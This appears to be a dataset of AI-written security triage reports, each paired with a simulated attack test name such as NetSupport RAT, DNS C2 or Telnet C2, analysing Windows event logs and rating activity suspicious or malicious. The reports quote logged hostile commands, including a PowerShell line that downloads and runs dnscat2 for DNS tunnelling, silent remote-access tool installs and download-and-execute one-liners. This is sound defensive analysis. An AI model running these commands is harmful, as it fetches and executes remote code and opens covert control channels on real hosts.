- Repeated and rapid execution of system utilities by the same user account without additional context (such as a legitimate software deployment or audit) can be considered suspicious, although not explicitly malicious without further context.

#### Resolution

**Resolution: SUSPICIOUS**

While the activity does not definitively confirm malicious intent or compromise, it exhibits behavior consistent with tactics a malicious actor might employ (e.g., using `netsh` to create unauthorized network redirections). The port number used (1337) additionally raises suspicion given its cultural significance in hacker terminology.

### Guidance on How to Proceed

1. **Verify Authorization**: Check the administrative logs or IT change records to determine if this network configuration change was authorized. Verify network management processes that involve `netsh` portproxy commands.

2. **Review User Activity**: Investigate whether the `SERVER002\admin_test` account activity is consistent with its expected role. Verify any associated access with the account and their typical activity.

3. **Network & Endpoint Monitoring**: Deploy more robust network monitoring tools to determine if there are unexpected connections or data transfers associated with port 1337.

4. **Audit for Persistence Mechanisms**: Check for any additional changes in the system settings that could have been put in place by unauthorized commands.

If further investigation reveals this activity is unauthorized or if unanticipated connections are detected, escalated response actions may be necessary."
Download a file with Microsoft Connection Manager Auto-Download,"### Detailed Analysis

#### Observations:
1. **Use of PowerShell**:
    - The execution of `powershell.exe` by `SERVER002\admin_test` user is observed. PowerShell is a legitimate Windows tool but is often used by attackers for malicious purposes due to its powerful capabilities.

2. **Frequent Use of `wevtutil.exe` and `conhost.exe`**:
    - `wevtutil.exe` is frequently executed. This utility is generally used to query or export event logs. Repeated execution by `SERVER002\admin_test` user could be suspicious if there are no clear business justifications.
    - Multiple executions of `conhost.exe` are observed. It hosts the Command Prompt (CMD) interface, frequent executions could suggest automated scripts or commands.

3. **Microsoft Edge Update Activity**:
    - Multiple instances of Microsoft Edge Update processes running with high integrity level (`System`). There are several executions associated with Edge updates such as `MicrosoftEdgeUpdate.exe`, which looks benign as it is a scheduled service to keep Microsoft Edge updated.
    - Launcher and installer files like `MicrosoftEdgeUpdateComRegisterShell64.exe` and `MicrosoftEdgeUpdateSetup_X86_1.3.195.27.exe` suggest typical update activities.

4. **Execution of `cmd.exe` with Command**:
    - Execution of `cmd.exe` with the command line `cmd.exe /c ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data\src\data.bat""` directs the output to null (`1>NUL`). This might indicate the execution of a script or batch file, which is redirected to suppress output. The lack of logging output could insinuate potential hidden activity.

5. **Execution of `hostname.exe` and `whoami.exe`**:
    - These two commands are typically used for recon by attackers or in automated scripts for gathering system information. The execution by `SERVER002\admin_test` may either be benign if conducted by administrators or analysts, or could suggest initial stages of an attack if such activity is unexpected.

6. **Logs Duration and Behavior**:
    - The logs cover a short time-frame and show various system and update activities. The constrained time and lack of corroborative evidence of malicious payloads or additional suspicious system calls make it challenging to determine the exact intent without additional context.

### Assessment

- **PowerShell**: Although the use of PowerShell can be potentially risky, there is insufficient information provided to confirm it was used for malicious purposes.
  
- **`wevtutil.exe` and `conhost.exe`**: The repeated executions could merit further investigation, but on their own do not confirm a malicious activity. This is normal when performed as a part of regular administrative functions.
  
- **Edge Update Activity**: Largely appears benign, aligning with legitimate system updates.
  
- **Command Execution**: The script execution and suppression might warrant further investigation, especially if such scripts are uncommon on this host.
  
- **System Reconnaissance**: The recon tools potentially indicate basic information gathering but, paired alone with no other indicators, could be part of a legitimate analysis or administration.

### Resolution

**SUSPICIOUS**

#### Guidance on How to Proceed
1. **Context Verification**: Verify if `SERVER002\admin_test` should be executing these processes, specifically focusing on `powershell.exe`, `wevtutil.exe`, `cmd.exe` with redirected outputs, and `whoami.exe`.
   
2. **Behavior Analysis**: Look for additional logs and context around these timestamps to see if there is other correlated suspicious activity or potential exfiltration.
   
3. **User Verification**: Confirm the identity and intention behind `SERVER002\admin_test` activities, particularly if the user is involved in regular maintenance or if there could be any credentials compromise.
   
4. **Manual Inspection**: Investigate any batch scripts or temporary files indicated in the logs for contents or additional clues.
   
Employ more comprehensive endpoint detection and response (EDR) monitoring on similar activities for logging and alerting if suspicious patterns repeat or escalate."
NetSupport - RAT Execution,"Upon analyzing the provided Windows event logs, several indicators and patterns emerge that can shed light on potential suspicious or malicious activities:

### Suspicious or Anomalous Behaviors

1. **Execution of `wevtutil.exe`:**
   - The logs show repeated execution of `C:\Windows\System32\wevtutil.exe` by the user `SERVER002\admin_test`. `wevtutil.exe` is a legitimate Windows process used primarily for managing event logs, but its repeated execution in a short period, without any concrete reason such as troubleshooting, can be indicative of evasion tactics or unauthorized log manipulation.

2. **PowerShell Execution:**
   - The logs reveal a PowerShell command executed with the following command line: 
     ```
     powershell.exe & {Start-Process \""C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\\Externalfiles\\data_NetSupport.exe\"" -ArgumentList \""/S /v/qn\""}
     ```
   - This command is notable due to its unusual working directory and execution of `data_NetSupport.exe`, indicating potential unauthorized software installation or activity aiming at remote control or administration without proper consent or security oversight.

3. **Installation of NetSupport Manager:**
   - The activity around `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\{B03BE996-6838-44A0-BDA2-9222346BA47F}\\data_NetSupport.exe` appears to be an attempt to install NetSupport Manager, a legitimate remote administration tool. However, it is often employed by threat actors for malicious purposes if installed surreptitiously and used without user consent.

4. **Failed Installation Logs:**
   - Logs from `MsiInstaller` display failed installation attempts (`EventID: 11708`) for NetSupport Manager. The presence of such failures could imply either a misconfiguration, lack of permission, or intentional blocking by security mechanisms.

5. **Privileged Context & Integrity Level:**
   - All activities were conducted under a high integrity level, implying administrative privileges. This, combined with the process control typically seen in legitimate activities and the lack of invocation of security measures like prompts or checks suggests potential concerns if the actions were unauthorized.

### Malicious Activity Indicators

The combination of installing potentially unwanted software through complex execution chains, leveraging PowerShell without clear administrative need, and modifying aspects related to system log management (via `wevtutil.exe`) are strong indicators that these actions:

1. **Suggest Unverified or Malicious Intent:**
   - The actions might be linked to a horizontal movement trying to manipulate or control system logs and install remote administration capabilities surreptitiously.

2. **Potential Remote Administration Tool Usage**:
   - NetSupport Manager's reputation as both a legitimate tool and a vector for unauthorized remote control needs to be evaluated, especially given its pattern of installation without clear, authorized documentation.

### Conclusion

This analysis identifies a need for deeper investigation, as the evidence already acquired hints towards an administrative account executing actions without clear, permissible governance, possibly indicating maliciousness:

**Resolution: SUSPICIOUS**

### Guidance on How to Proceed

1. **Immediate Isolation:**
   - Consider temporarily isolating the affected host to prevent potential propagation or further intrusion.

2. **Comprehensive Review:**
   - A detailed security audit should be conducted with a focus on recent administrative sessions and external network communications involving `data_NetSupport.exe`.

3. **Examine Administrative Records:**
   - Validate the credentials and intentions behind `SERVER002\admin_test`.

4. **Enhance Monitoring:**
   - Increase system monitoring and logging for similar patterns across the network.

5. **Update Defenses:**
   - Ensure that antivirus and intrusion detection/prevention systems are updated with signatures that can detect known malicious utilizations of NetSupport Manager.

By addressing these measures, the goal should be to identify, contain, and rectify potential threats while understanding the source and motivation behind the anomalous activities detailed in the log analysis."
RustDesk Files Detected Test on Windows,"After analyzing the provided event logs, several indicators suggest potentially suspicious and malicious activities. Here is a detailed breakdown:

1. **Anomalous Process Execution:**
   - **PowerShell Execution:** A PowerShell script (as seen in the Windows PowerShell log) downloads and executes a file from an external URL (`https://github.com/rustdesk/rustdesk/releases/download/1.2.3-1/rustdesk-1.2.3-1-x86_64.exe`). This behavior is consistent with potential malicious scripts executed by attackers to download malware or other unauthorized software.
   - **RustDesk Application:** The Sysmon log shows the execution of `rustdesk-1.2.3-1-x86_64.exe` from an unknown source, which matches the downloaded file. This could be a remote administration tool possibly used for unauthorized access.
   - **Taskkill Command:** Usage of the `taskkill` command targeting `RuntimeBroker_rustdesk.exe`, suggesting the script attempts to manipulate or alter running processes, which could indicate a compromise.

2. **Privileged Logon and Privilege Escalation:**
   - **Event 4672:** Assigned special privileges to `admin_test` including `SeDebugPrivilege`, indicating potential privilege escalation or usage of high-level permissions that might not be typical for routine administrative tasks. This event is flagged multiple times.
   
3. **Multiple Credential Access Failures:**
   - **Security Event 5379 Repetitions:** These failed read operations targeting various credentials for `MicrosoftAccount` and `WindowsLive` can imply credential harvesting attempts or the misuse of credentials, a common indicator of a compromised system.
   
4. **Process Creations not Typically Observed:**
   - Execution of whoami and system utilities such as `conhost.exe`, `svc`, and `taskhostw.exe` repeatedly in a short span of time may imply automated tasks or scripts execution, potentially indicating unauthorized monitoring or system enumeration.

5. **Inconsistent Time Zone and Time Settings:**
   - The adjustments of system time (`EventID 1` and `24` in the System log) involving `svchost.exe` are suspicious unless planned as part of maintenance, as these can be used by attackers to cover tracks or sync to external command and control servers.

**Assessment and Resolution:**
Upon review of the event logs, considering the unexpected usage of high-privilege account activities, executions of external scripts via PowerShell, repeated credential reading failures, and inconsistency in time settings, the logs reveal substantial evidence of potentially malicious activity. Given these findings, it would be appropriate to classify this case as **MALICIOUS**.

**Guidance and Next Steps:**
- **Immediate Containment:** Disconnect the machine from the network to prevent further spread or exfiltration.
- **Further Investigation:**
  - Analyze the `rustdesk-1.2.3-1-x86_64.exe` file to determine its behavior and origin.
  - Conduct thorough forensic analysis to investigate the source of the PowerShell script.
- **Remediation:**
  - Audit and potentially reset the credentials that may have been involved.
  - Patch and update all system software to close any vulnerabilities being exploited.
  - Implement stricter PowerShell execution policies and monitor script usage.
- **Proactive Security Measures:**
  - Consider enhancing security monitoring with endpoint detection and response (EDR) solutions.
  - Educate end-users about the dangers of phishing and executing foreign scripts."
Embedded Script in Image Execution via Extract-Invoke-PSImage,"Upon reviewing the provided logs, there are indicators of potentially malicious activity. Here are the findings based on the examination of each log type:

### Application Log:
- The provided entry shows that Windows Defender is active. This is a typical entry and does not indicate any issues by itself.

### Windows PowerShell Log:
- There is a PowerShell script execution that appears suspicious. The PowerShell command involves the extraction of a script from an image file named `evil_kitten.jpg`, which suggests steganography might be in use to hide scripts or data within image files. Additionally, the steps in the script include decoding Base64 content, extracting text patterns, and executing the resultant scripts. This behavior is highly indicative of potentially malicious activities such as file-less malware or other stealthy operations.

### Sysmon Log:
- Multiple processes related to `powershell.exe`, `conhost.exe`, and `wevtutil.exe` are observed. The presence of PowerShell being launched under a user named ""admin_test"" aligns with the suspicious activity seen in the PowerShell logs.
- The presence of `wevtutil.exe` can be typical for legitimate uses, such as event log management, but when combined with unusual PowerShell commands, it becomes suspect.
- Additionally, process creation activities show the execution of `whoami.exe`, which could be used by an attacker to pivot to another process or verify access level.

### Assessment:
- **Indicators of Compromise (IOCs):** Use of PowerShell to extract and run possibly malicious scripts, especially from non-standard image files (`evil_kitten.jpg`), is a strong indicator of malicious behavior typically associated with advanced persistent threats (APT) or file-less malware.
- **Run Commands:** Commands found in the logs appear crafted to obfuscate the intent and bypass typical detection mechanisms.
- **Steganography Usage:** Potential use of images to hide malicious scripts is a technique used by attackers to maintain stealth.

### Recommendation:
1. **Immediate Investigation:** A deeper investigation is required to analyze the contents of the extracted scripts to determine the exact nature of the threat.
2. **Isolation:** Consider isolating the affected host to prevent potential lateral movement within the network.
3. **Forensic Analysis:** Conduct a thorough forensic analysis of the file system, focusing on the paths used in the PowerShell execution.
4. **Review AD Logs:** Correlate these findings with logs from Active Directory to check for unusual account activities or potential privilege escalation attempts.
5. **Update Security Measures:** Ensure that all antivirus and endpoint detection systems are updated and configured to detect similar threats.

### Resolution:
- **MALICIOUS**: The activity appears to be malicious with a high level of confidence due to the techniques and methods observed in the logs."
Download a file using wscript,"Upon reviewing the provided log data, here is a detailed analysis based on the Sysmon logs primarily, as the other logs (System, Windows PowerShell, Security) were not populated:

### Analysis:

1. **Microsoft EdgeUpdate Activity:**
   - The logs indicate frequent execution of `MicrosoftEdgeUpdate.exe` and related components like `MicrosoftEdgeUpdateComRegisterShell64.exe` and `MicrosoftEdgeUpdateSetup_X86_1.3.195.27.exe`. 
   - The processes are primarily executed under `NT AUTHORITY\SYSTEM`, which is standard for system-level tasks.
   - Multiple instances of Edge updates and COM registration activities are noted.

2. **PowerShell Activity:**
   - A PowerShell execution (`C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe`) is associated with the user `SERVER002\admin_test`. 
   - The PowerShell entry in itself is not enough to determine malicious intent without context on what script or commands were executed.

3. **Command Line and Script Execution:**
   - An instance of `cmd.exe` is executing a Visual Basic Script (`wscript.exe ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data\\src\\data-download-file.vbs""`). The context of the VBS script execution could potentially be suspicious, depending on the nature of the script.

4. **Wevtutil.exe Usage:**
   - The frequent appearance of `wevtutil.exe` (an event log management utility) under `SERVER002\admin_test` might be slightly suspicious if the logs are being cleared or manipulated excessively without appropriate system or administrative maintenance context.

5. **Processes and Command Line Arguments:**
   - The `cmd.exe` instance executing a VBScript could be indicative of a scheduled or scripted operation, which is worth inspecting further, particularly regarding the intentions of `data-download-file.vbs`.

6. **High Integrity Level and System Authority:**
   - Processes running under 'High' integrity or 'System' integrity levels are indicative of privileged executions, such as installations or updates, explained by the presence of Edge components.

### Conclusion:

- The primary suspicious behavior is the execution of a VBScript through `cmd.exe`, which could potentially be used for downloading files, typically indicative of a potential malicious activity if not part of a standard operating procedure or legitimate process.
- The user `SERVER002\admin_test` has several activities across the logs which might require closer inspection, particularly with PowerShell and `wevtutil.exe` executions.

### Resolution:

Based on the analysis, the final assessment is:
- **SUSPICIOUS** - The activity logs, especially the execution of the script via `cmd.exe` and intensive log interaction by `wevtutil.exe` by a specific user require further investigation to rule out any signs of potential compromise or unauthorized actions.

### Recommended Actions:

- Conduct a thorough review of the `data-download-file.vbs` script to understand its purpose and ensure it aligns with legitimate operations.
- Verify with the user `SERVER002\admin_test` about the purpose and authorization of their activities.
- Investigate the need and context behind the multiple `wevtutil.exe` executions to ensure no log tampering or unauthorized clearing is occurring.
- Monitor this and related systems for any further unusual behavior and consider implementing tighter controls or limiting script execution capabilities through Group Policies or similar security measures."
Malicious User Agents - CMD,"After a thorough analysis of the provided Sysmon logs of the Windows host on ""Server002"", several points of interest arose that could indicate suspicious behavior:

1. **Usage of PowerShell and Command Prompt (cmd.exe):**
   - Standard use of PowerShell application observed, which is commonly used for legitimate administrative tasks. However, it can also be exploited for malicious activity.
   - The command prompt was executed with a potentially suspicious command line involving `curl` to connect to various websites like `www.google.com` using different user-agent strings. This behavior can be indicative of network reconnaissance or script-based web requests that bypass regular user interaction.

2. **Multiple `curl.exe` Executions:**
   - Executions of `curl.exe` under the context of `SERVER002\\admin_test` user with high integrity levels suggest automated tasks potentially running these commands. While `curl.exe` is a legitimate tool, its usage here is peculiar since it attempts connection using varied User-Agent values typical of network enumeration tactics.

3. **Scheduled Software Updates:**
   - There are multiple entries involving `MicrosoftEdgeUpdate.exe` in its different forms performing operations which include typical update tasks like registration and installation. These activities are consistent with standard software updates and are executed under `NT AUTHORITY\\SYSTEM`, a legitimate privilege level for auto-updates. 

4. **Use of the `wevtutil` Tool:**
   - Entries pertaining to `wevtutil.exe` (Event Log utility) executed by `SERVER002\\admin_test`. Although this can be used for legitimate log management, the pattern and timing may suggest potentially malicious log clearing or manipulation soon after network reconnaissance activities which should be further examined.

5. **Mixed Indicator Context:**
   - Although there are legitimate reasons for certain activities observed (e.g., updates, Hostname checks), the combination of these with network tool usage might suggest a deeper exploration is warranted, especially if an anomaly exists in user patterns or system states at the reported timestamps.

### Assessment and Resolution:
- **SUSPICIOUS**

The compiled evidence doesn't outrightly confirm malicious actions, as many processes align with system updates or administrative tasks. However, the patterns of `cmd` and `curl` usage, especially under high privileges and shortly after software update activities, are atypical.

### Guidance on How to Proceed:
1. **Elevate Monitoring:** Increase the scrutinization of logs, focusing on network activity logs to ascertain any outbound connections or anomalous traffic patterns post these timestamps.
2. **User and Access Investigation:** Verify whether the operations performed by `SERVER002\\admin_test` are expected and legitimate, potentially by communicating with the user.
3. **Review Software Update Sources:** Ensure all updates, especially the ones logged for `MicrosoftEdgeUpdate`, are originating from legitimate Microsoft sources.
4. **Check for Persistence Mechanisms:** Search for any recent additions in the startup processes, scheduled tasks, or service entries not part of the standard configuration.
5. **Audit Event Logs for Tampering:** Perform a forensic comparison of the logs for indicators of log alteration or removal using `wevtutil` since it appeared multiple times.

This combined approach should offer deeper insight and validation or disprove any anomalous activity concerns."
Windows - PowerShell Download,"Based on my analysis of the provided Windows event logs, I have identified certain activities that warrant further investigation, as well as some items that appear benign:

**Suspicious Behavior:**

1. **PowerShell Activity:**
   - A PowerShell command was executed to download a file from the internet: `(New-Object System.Net.WebClient).DownloadFile(""https://raw.githubusercontent.com/file/file-file/master/LICENSE.txt"", ""$env:TEMP\\file-license.txt"")`. The use of PowerShell for downloading files from the internet is a common technique in malicious activities, especially if such actions are not normally consistent with typical user behavior or authorized updates/scripts.

2. **Sysmon Logs Related to PowerShell:**
   - The downloaded file activity correlates with a Sysmon event that shows PowerShell executing with a high integrity level under the user ""SERVER002\\admin_test"". This high integrity level suggests that the session had elevated privileges, which can be suspicious if unsolicited.
  
3. **Frequent Execution of `wevtutil.exe` and `conhost.exe` by `SERVER002\\admin_test`:**
   - The repeated invocation of `wevtutil.exe` and `conhost.exe` suggests possible manipulation or extraction of Windows event logs. Such activity could be an attempt to clear logs or cover tracks, which is a tactic often used in post-exploitation scenarios.

**Benign Activity:**

1. **Microsoft Edge Update:**
   - The logs contain numerous entries related to Microsoft's Edge Update process, including the execution of `MicrosoftEdgeUpdateSetup_X86_1.3.195.27.exe` and related sub-processes. These correspond to standard update operations and do not appear to contribute to any unauthorized activities.

**Assessment:**

The mixture of normal software update processes and potentially suspicious PowerShell usage, combined with frequent execution of `wevtutil.exe` and `conhost.exe` by an administrative user, leads to a classification of the activity as **SUSPICIOUS**. This designation arises due to the PowerShell actions that might indicate a breach or malicious intent, as well as certain processes that exhibit behavior consistent with possible log tampering or unauthorized system access.

**Recommendation:**

1. **Further Investigation:** 
   - Investigate the origin and intention of the PowerShell command. Validate whether it was part of a legitimate script or user action.
   - Audit the activities of `SERVER002\\admin_test` to ensure there has been no unauthorized access or privilege abuse.
   - Review internet-access logs or proxy records for any other anomalous downloads or connections.
   
2. **Monitoring and Alerts:**
   - Enhance monitoring of PowerShell activities and implement alerts for unusual PowerShell command invocations.
   - Monitor for frequent or unusual usage of `wevtutil.exe` and `conhost.exe`.

Resolution: **SUSPICIOUS** - The logs contain activity that doesn't look right and needs more investigation."
DNS over HTTPS Long Domain Query,"Upon analyzing the provided log entries, a number of distinct observations pertaining to potentially anomalous or suspicious behaviors were identified:

1. **Timestamp Changes (Event ID 4616 and 24):** 
   - Multiple events related to time changes were identified. Event ID 4616 is a typical auditing event related to time change, and Event ID 24 (in the System log) is linked to changes in the timezone, which includes minor time synchronization adjustments. These logs appear consistent with automatic system time synchronization via Network Time Protocol (NTP). No explicit signs of tampering were observed.

2. **Process Executions:**
   - Several Sysmon events (Event ID 5) show the execution of system processes such as `wevtutil.exe`, `conhost.exe`, and `hostname.exe`. These are legitimate Windows processes. However, repeated executions of `wevtutil.exe`, commonly used for reading logs and configuring event settings, along with `conhost.exe` may warrant attention if they occurred unexpectedly or without a corresponding user action.

3. **PowerShell Script Execution:**
   - The execution of a PowerShell script (`data-doh-domain-length.ps1`) was logged with a network-based operation (using a DNS-over-HTTPS query to `8.8.8.8`). While PowerShell is a powerful tool for legitimate administration tasks, its use for network operations can signal suspicious behavior if unexpected. The presence of administrative-level tasks executed from a temporary user profile (`C:\Users\ADMIN_~1\`) aligns with potential indicators of compromise, especially if the script was not a part of regular operations.

4. **Microsoft Edge Updates (Event IDs 1 and 5 in Sysmon):**
   - Extensive logging related to Microsoft Edge Update processes was observed. This could represent typical application update behavior. However, the sheer number of related logs might require context clarification with respect to users' experience during that exact time.

Given the findings above, this assessment indicates that while much of the activity could be within the boundaries of benign, legitimate functions, specific activities like unexpected PowerShell executions, particularly with network components, suggest a possible intrusion or misuse, especially if not authorized or an expected part of the system’s operations.

**Resolution: SUSPICIOUS**

This conclusion leans on the potential risk associated with PowerShell usage, suggesting that while the other activities align with routine operations, further investigation is warranted into any unexpected script executions or changes to system configurations. Proceed with checking the script's origin, intended use, correspondences with user activities, and potential external communication for threat hunting. Regular scanning for Indicators of Compromise (IoCs) should be conducted to mitigate any arising threats."
DNS C2,"Upon reviewing the provided logs, several indicators of potentially malicious activity have been identified. Here are the key findings from the logs:

### Key Findings

1. **PowerShell Activity:**
   - The PowerShell logs indicate the execution of a script downloaded from an external source:
     ```
     HostApplication=powershell.exe & {IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1')
     Start-Dnscat2 -Domain example.com -DNSServer 127.0.0.1}
     ```
   - This suggests the download and execution of a dnscat2 payload, a tool commonly used for DNS tunneling, indicating potential data exfiltration or command and control activities.

2. **Event Log Tampering:**
   - Several Sysmon logs show the use of `wevtutil.exe`, which can indicate log file manipulation attempts, often used to cover tracks:
     ```
     Image=""C:\\Windows\\System32\\wevtutil.exe""
     ```

3. **Suspicious Process Creation:**
   - The execution of `nslookup.exe` from a PowerShell process:
     ```
     CommandLine=""C:\\Windows\\system32\\nslookup.exe""
     ```
   - Usage of `nslookup` in conjunction with PowerShell may indicate an attempt to perform network reconnaissance or to test DNS resolution as part of the dnscat2 activities.

4. **Multiple Instances of Elevated Privileges:**
   - There are several entries showing high integrity levels and elevated privileges for processes such as PowerShell, which may indicate privilege abuse:
     ```
     IntegrityLevel=""High""
     ```

5. **Credential Access Attempts:**
   - Repeated attempts to access MicrosoftAccount information with EventID 5379, resulting in `ReturnCode"":""3221226021""` indicating logon failure, Captive Portal, or a similar issue, but frequent access attempts can be suspicious.

### Assessment

Based on the analysis, the logs exhibit multiple indicators of potentially malicious activities. The use of PowerShell to execute scripts from external sources, the manipulation of event logs, and unexplained network tool executions (like nslookup) strongly suggest malicious intent. 

### Resolution

**Resolution: MALICIOUS**

Given the identified activities, the conclusion is that the logs contain indicators of malicious activity. Immediate steps should be taken to address this potential security breach. Recommended actions include:

1. **Containment and Eradication:**
   - Isolate the affected host to prevent further interaction with external command and control servers.
   - Terminate suspicious and unauthorized processes.
   - Remove the identified malicious PowerShell scripts and any associated footholds.

2. **Investigation and Recovery:**
   - Conduct a thorough forensic investigation of the host to identify the full scope of the compromise.
   - Review access logs and network traffic for any unusual patterns or unauthorized data exfiltration.

3. **Hardening and Monitoring:**
   - Implement stricter PowerShell execution policies to limit script execution.
   - Enhance monitoring for future indicators of compromise, especially monitoring for abnormal PowerShell activities and unusual network traffic.
   - Ensure all systems have the latest security patches applied and antivirus/endpoint protection solutions are active and updated.

By taking these steps, the organization can mitigate the effects of the identified malicious activities and strengthen its security posture against future threats."
Telnet C2,"### Analysis of Windows Event Logs

#### Application Log
- Two events representing the ""edgeupdate"" service stopping are recorded. This is a usual occurrence when software updates are completed, specifically for Microsoft Edge. These events themselves are not indicative of any suspicious or malicious activity.

#### Windows PowerShell Log
- A PowerShell execution is observed with the command:
  ```
  powershell.exe & {C:\Users\ADMIN_~1\AppData\Local\Temp\file\data\bin\telnet_client.exe 127.0.0.1 --port 23}
  ```
  - This command suggests an execution of a Telnet client, which by itself could be concerning if Telnet is not typically used within the organization's environment. Telnet is known for being a less secure protocol due to the lack of encryption, making it potentially anomalous or risky if used without proper security justification.
  - The binary runs from a temporary directory path, often a tactic used in malicious activities to evade detection.

#### Sysmon Log
- Multiple executions and process creations were noted, mainly involving legitimate Microsoft Edge Update processes. The paths and file hashes are consistent with what is expected for updates:
  - Microsoft Edge Update processes are legitimate Microsoft actions, frequently in the background for updating purposes.
- However, the execution of `telnet_client.exe` through PowerShell linked to the ""Server002\admin_test"" user is noteworthy, given it coincides with potential unauthorized communication attempts through Telnet.

### Assessment
- **Anomalous PowerShell Execution**: The notable incident here is the PowerShell command executing `telnet_client.exe`. Without more context on this script's purpose and history of the Telnet client use, this behavior is flagged as suspicious.
- **Legitimate EdgeUpdate Activities**: The recorded activities related to Microsoft Edge Update are benign and typical during update processes.

### Conclusion
**SUSPICIOUS**: The logs reveal suspicious activity due to:
- The unusual execution of a Telnet client via PowerShell from a temporary directory.
- The potential threat associated with the use of Telnet without encryption.

### Guidance
- **Further Investigation Needed**:
  - Check the origin of `telnet_client.exe` and its intended use.
  - Audit past use of Telnet across the organization and verify if it aligns with established security policies.
  - Review any corresponding network logs for unusual Telnet traffic.
- **Action**:
  - Engage with the system's administrator to understand if Telnet has a legitimate usage.
  - Conduct a security review of the user account (""admin_test"") and investigate for any unauthorized activities or deviations from normal behavior."
Malicious User Agents - Powershell,"Upon analyzing the provided Windows event logs, the following observations were made:

1. **Security Log (Event ID 4799)**:
   - The log shows execution of a process `setup.exe` located within a temporary directory as part of an Edge installation process. It is executed by the built-in `$` machine account, which in itself, is not inherently unusual as machine accounts are expected to perform system-level installations. The path and context suggest this is likely related to a Microsoft Edge update or installation, which typically runs with SYSTEM privileges for legitimate operations.

2. **PowerShell Logs (Event ID 600)**:
   - Multiple PowerShell instances are executing `Invoke-WebRequest` commands using different user agents targeting `www.google.com`. This pattern resembles a reconnaissance or testing behavior to possibly fingerprint capabilities or detect network filtering, as these requests simulate different commonly used web clients.
   - Although these actions could be benign or part of scheduled scripts, the variety and nature of the requests do trigger suspicion due to the potential for misuse.

3. **Sysmon Events**:
   - Events detail the execution and lineage of various processes like `hostname.exe`, `whoami.exe`, and PowerShell, which could imply normal administrative activity such as gathering system information or operating environment details.
   - Edge installation activities are recorded in-depth, confirming the execution of `setup.exe` and associated processes as legitimate operations related to Microsoft Edge updates with a valid hash.
   - The presence of repeated setups and their logs affirms this is a systematic update process rather than standalone downloads from suspicious sources.
   - Some utility executables like `wevtutil.exe` and `conhost.exe` are observed with elevated privileges, which align with legitimate uses in system operations.

4. **Application Log**:
   - The log entry from the Software Protection Platform Service doesn’t reveal any immediate threat—it associates with a typical operation involving licensing or related system policies.

5. **System Log**:
   - The time synchronization with `time.windows.com` appears as expected for system timekeeping purposes without any anomalies.
  
## Assessment

- **Suspicious Activity**: The behavior exhibited by the PowerShell commands is the most suspicious aspect of the logs due to their nature of mimicking request patterns from various user-agents. This doesn't confirm malicious intent but warrants further investigation due to patterns typically observed in evasive reconnaissance efforts.

- **Benign Activity**: The Edge update processes, time synchronization, and service executions appear benign and align with typical operations seen in system management activities.

## Resolution
The resolution for this set of logs is **SUSPICIOUS**. There is a need for further investigation into the PowerShell activity to determine if it was part of a legitimate task or indicative of reconnaissant probing. Recommending that network and endpoint monitoring be enhanced to capture any unusual or repeated patterns and validate whether the network requests originate from authorized scripts or tasks. "
File Download via PowerShell,"After analyzing the provided Windows event logs, several entries stand out and merit attention:

1. **PowerShell Activity:** The Windows PowerShell logs indicate a specific command execution using PowerShell to download and write content from an external URL into a file called `LICENSE.txt` and then invoke that file. The command is as follows:
   ```powershell
   powershell.exe & {(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/file/file-file/4042cb3433bce024e304500dcfe3c5590571573a/LICENSE.txt') | Out-File LICENSE.txt; Invoke-Item LICENSE.txt}
   ```
   This behavior is highly suspicious as it involves downloading a file from the internet and executing it, which is a typical technique used by attackers to introduce malicious files onto a host.

2. **Command Execution Context:** The execution context for the PowerShell command and subsequent process executions (such as `notepad.exe`) involve a user identified as `SERVER002\admin_test`, operating at a high integrity level. The use of high integrity levels and the command execution pattern could indicate an attempt at privilege misuse or escalation.

3. **System Time Manipulation:** There are multiple entries in the Security and System logs showing slight manipulation of system time:
   - Security Event ID 4616 and System Event ID 1 indicate changes in system time by the `svchost.exe` process. Although such changes might not be malicious by themselves, when combined with other suspicious activities, they signal potential attempts to obfuscate malicious activities' timing.

4. **Process Chains:** The Sysmon logs display process creation events originating from common windows utilities (`whoami.exe`, `conhost.exe`, and others) executed by the `admin_test` user. While the use of `whoami.exe` and `hostname.exe` might be benign for identifying the current user and computer, the combination with the PowerShell activity mentioned earlier reinforces the suspicion.

**Resolution and Recommendations:**

- **Resolution:** SUSPICIOUS
  The logs contain activity, specifically the PowerShell script execution attempting to download and execute content from an external source, that does not look right and needs more investigation to rule out any malicious intent. Additionally, there are indications of potential privilege misuse and system time manipulation that, although not definitively malicious, require scrutiny.

- **Recommendations:**
  - Conduct a thorough inspection of the system's network traffic logs to determine if any outgoing connections match the URL in the PowerShell script.
  - Verify the origin and content of the `LICENSE.txt` file and any other files created around the time of the PowerShell execution.
  - Audit the access and actions of the user `admin_test`, focusing on administrative tasks and high-integrity operations performed around the logged events.
  - Investigate whether there are any scheduled tasks or startup scripts that might be executing unauthorized PowerShell commands.
  - Apply enhanced monitoring to detect similar PowerShell-based activity in the future, possibly employing script block logging for PowerShell commands.

Engaging with the user `admin_test` and any potential associated users or alerting the security operations center for real-time monitoring while the investigation proceeds is advisable."
